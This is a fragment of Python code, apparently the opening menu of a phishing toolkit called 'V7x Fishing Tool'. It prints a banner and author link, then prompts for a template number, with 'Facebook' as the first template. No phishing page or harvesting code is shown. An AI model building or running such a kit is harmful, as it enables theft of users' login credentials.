    ...
    #    print (" ")
     #   print ("\033[1;32m  V7x Fishing Tool  \033[1;36m  * _ *  \033[1;32m  Version: \033[1;31m2   \033[1;32m Date: \033[1;31m10-3-2020            ")
      #  print ("        ")
        ...
        print ("\033[1;34m _______  _______  _        _______")
        print ("\033[1;34m(  ____ \(  ___  )( \      (  ___  )|\     /|")
        print ("\033[1;34m| (    \/| (   ) || (      | (   ) || )   ( |")
        print ("\033[1;34m| (_____ | (___) || |      | (___) || (___) |")
        print ("\033[1;34m(_____  )|  ___  || |      |  ___  ||  ___  |")
        print ("\033[1;34m      ) || (   ) || |      | (   ) || (   ) |")
        print ("\033[1;34m/\____) || )   ( || (____/\| )   ( || )   ( |")
        print ("\033[1;34m\_______)|/     \|(_______/|/     \||/     \|")
        ...
        print(S)
        ######7x
        print ("\033[1;36mFacebook >> \033[1;33mhttps://www.facebook.com/salah.aymansalem\n\n")
#        text = Text('B#[C#*B#] Enter Number C#:W# ')
        page = input("[*] Enter Number : ")
        try:
            page = int(page)
            templates = {
            1:'Facebook',
